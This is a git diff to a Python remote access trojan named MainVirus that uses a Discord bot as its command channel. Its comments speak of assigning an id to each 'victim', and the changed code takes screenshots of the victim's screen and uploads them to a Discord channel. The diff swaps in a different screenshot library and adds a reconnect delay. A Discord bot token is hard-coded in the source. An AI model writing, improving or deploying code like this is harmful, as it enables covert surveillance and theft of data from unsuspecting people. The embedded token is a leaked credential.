@@ -3,7 +3,9 @@ import lightbulb, hikari, asyncio, os, random, socket, subprocess, \
 from parser import Parser
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from pathlib import Path
+from PIL import ImageGrab
 import base64
+import time
 
 
 class MainVirus:  # Making a class to wrap code cause organisation
@@ -30,6 +32,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
                 token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
                 default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
         except:  # what to do if connection fails
+            time.sleep(3)
             self.make_connection()  # I run the program again if the connection fails
 
     def make_id(self):  # This Function makes a unique id for each victim
@@ -88,7 +91,7 @@ class MainVirus:  # Making a class to wrap code cause organisation
                 now = datetime.datetime.now()  # Gets the current time
                 fileLoc = os.path.join(os.getcwd(), "screenshot", f"screenshot[{now.year}-{now.month}-{now.day}-{now.hour}-{now.minute}-{now.second}].png")  # Sets the fileLoc
                 await self.bot.rest.create_message(self.channel_id, "Taking Screenshot")  # Screenshot alert
-                screenshot = pyautogui.screenshot()  # Takes a screenshot
+                screenshot = ImageGrab.grab()  # Takes a screenshot
                 screenshot.save(fileLoc)  # Saves screenshot
                 await self.bot.rest.create_message(self.channel_id, "Sending Screenshot")  # Sending image alert
                 await self.bot.rest.create_message(self.channel_id, hikari.File(fileLoc))  # Sends File
